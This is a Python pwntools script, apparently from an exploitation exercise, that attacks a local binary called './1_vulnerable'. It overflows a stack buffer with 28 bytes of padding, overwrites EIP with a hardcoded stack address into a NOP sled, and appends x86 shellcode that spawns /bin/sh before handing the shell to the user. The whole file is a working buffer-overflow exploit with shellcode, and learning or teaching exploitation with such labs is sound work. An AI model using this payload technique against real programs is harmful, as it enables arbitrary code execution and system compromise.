#!/usr/bin/python 
from pwn import * 

def main(): 
	# Starts the process
	p = process("./1_vulnerable")

	# For GDB debugger
	raw_input(str(p.proc.pid))
	
	# Creating payload
	offset = 28
	bof = "A" * offset # 28 bytes to EIP

	# We need to jump to an address that is in the middle of the NOP sled 
	return_address = 0xffffd570 + offset + 80 # 0 -> somewhere in the middle(80) -> 200(max read size) 

	# Shellcode to spawn a command shell
	shellcode =  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
        shellcode += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
        shellcode += "\x80"

	payload = bof + p32(return_address)
	read_size = 200 # Max read size, refer to source code	
	
	NOP = '\x90' * (read_size - len(payload) - len(shellcode)) # To determine the length of the NOP-sled
	payload += NOP + shellcode # Payload = bof + p32(return_address) + NOP + shellcode

	# Send payload to program
	p.send(payload)

	# Pass interaction of program back to user
	p.interactive()	

if __name__ == "__main__":
	main()
